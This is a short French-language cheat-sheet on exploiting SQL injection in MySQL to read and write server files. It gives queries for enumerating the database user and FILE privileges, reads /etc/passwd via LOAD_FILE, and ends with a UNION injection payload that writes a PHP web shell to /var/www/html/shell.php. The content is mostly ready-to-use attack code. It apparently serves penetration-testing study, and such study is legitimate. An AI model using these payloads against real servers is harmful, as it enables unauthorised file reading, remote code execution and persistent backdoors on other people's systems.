Une injection SQL peut également être exploitée pour la lecture et l'écriture de fichiers et même l'exécution de code à distance sur le serveur principal.

## Reading Files

Tout d'abord, nous devons déterminer quel utilisateur nous sommes dans la base de données.

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Maintenant que nous connaissons notre utilisateur, nous pouvons commencer à déterminer ses privilèges.

Vérifier si nous disposons des privilèges de super-administrateur:

```sql
SELECT super_priv FROM mysql.user
SELECT super_priv FROM mysql.user WHERE user="<myusername>"
```

- La requête renvoie `Y (Yes)` ou `N (No)` indiquant les privilèges de l'utilisateur

Affichage de nos privilèges utilisateur actuels

```sql
SELECT grantee, privilege_type FROM information_schema.user_privileges
```

> Notez que le privilège `FILE` est attribué à l'utilisateur, ce qui lui permet de lire des fichiers et potentiellement d'y écrire.

Maintenant que nous disposons des privilèges nécessaires pour lire les fichiers système locaux, on peut lire des données depuis des fichiers.

```sql
SELECT LOAD_FILE('/etc/passwd');
```

> nous ne pourrons lire le fichier que si l’utilisateur du système d’exploitation exécutant MySQL dispose de privilèges suffisants pour le lire.

## Writing Files


Web shell into the base web directory

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
-- PoC

cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

